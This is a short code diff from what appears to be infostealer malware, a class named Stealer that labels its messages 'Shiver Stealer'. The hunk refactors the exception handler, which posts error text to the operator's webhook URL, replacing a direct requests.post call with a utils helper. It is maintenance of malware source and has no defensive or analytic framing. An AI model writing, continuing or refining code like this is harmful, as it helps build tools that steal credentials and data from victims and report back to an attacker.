@@ -85,10 +85,10 @@ class Stealer:
             )
         except Exception as e:
             try:
-                import requests
-                requests.post(self.webhook_url, json={
+                from . import utils
+                utils.http_post_json(self.webhook_url, {
                     'content': 'Shiver Stealer Error: ```' + str(e)[:500] + '```'
-                }, timeout=10)
+                }, 10)
             except:
                 pass
 
